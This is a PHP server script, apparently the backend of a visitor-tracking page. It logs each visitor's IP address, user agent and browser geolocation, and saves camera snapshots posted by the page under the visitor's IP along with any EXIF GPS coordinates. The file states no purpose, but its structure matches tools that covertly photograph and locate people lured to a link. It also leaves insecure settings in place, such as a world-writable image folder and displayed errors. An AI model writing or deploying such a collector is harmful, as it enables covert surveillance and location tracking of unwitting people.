<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$json_file = 'users.json';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s');
$data = [];

if (file_exists($json_file)) {
    $content = @file_get_contents($json_file);
    $data = json_decode($content, true);
    if (!is_array($data)) {
        $data = [];
    }
} else {
    if (file_put_contents($json_file, json_encode([], JSON_PRETTY_PRINT)) === false) {
        error_log("Failed to create users.json at " . date('Y-m-d H:i:s'));
        echo "Error: Cannot create users.json";
        exit;
    }
    $data = [];
}

$record = [
    'ip' => $ip,
    'location' => 'Pending',
    'user_agent' => $user_agent,
    'image_path' => 'Pending',
    'timestamp' => $timestamp
];

if (isset($_POST['lat']) && isset($_POST['lon'])) {
    $record['location'] = "Lat: {$_POST['lat']}, Lon: {$_POST['lon']}";
} elseif (isset($_POST['location_error'])) {
    $record['location'] = 'Error: Location access denied';
} elseif (isset($_POST['location_not_supported'])) {
    $record['location'] = 'Error: Geolocation not supported';
}

if (isset($_POST['image'])) {
    $image_data = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $_POST['image']));
    if ($image_data === false) {
        $record['image_path'] = 'Error: Invalid image data';
        error_log("Invalid image data received at " . date('Y-m-d H:i:s') . " from IP: " . $ip);
    } else {
        $image_filename = "{$ip}_" . time() . ".png";
        $image_path = "images/" . $image_filename;

        if (!file_exists('images')) {
            if (!mkdir('images', 0777, true)) {
                $record['image_path'] = 'Error: Failed to create images directory';
                error_log("Failed to create images directory at " . date('Y-m-d H:i:s') . " from IP: " . $ip);
            }
        }

        if (file_put_contents($image_path, $image_data) !== false) {
            $record['image_path'] = $image_path;
            $exif = @exif_read_data($image_path);
            if ($exif && isset($exif['GPSLatitude'])) {
                $record['location'] = "EXIF Lat: {$exif['GPSLatitude']}, Lon: {$exif['GPSLongitude']}";
            }
        } else {
            $record['image_path'] = 'Error: Failed to save image to ' . $image_path;
            error_log("Failed to save image to $image_path at " . date('Y-m-d H:i:s') . " from IP: " . $ip);
        }
    }
} elseif (isset($_POST['camera_error'])) {
    $record['image_path'] = 'Error: Camera access denied';
}

$data[] = $record;
if (file_put_contents($json_file, json_encode($data, JSON_PRETTY_PRINT)) === false) {
    error_log("Failed to write to users.json at " . date('Y-m-d H:i:s') . " from IP: " . $ip);
    echo "Error: Cannot write to users.json";
} else {
    echo "Data saved successfully";
}
?>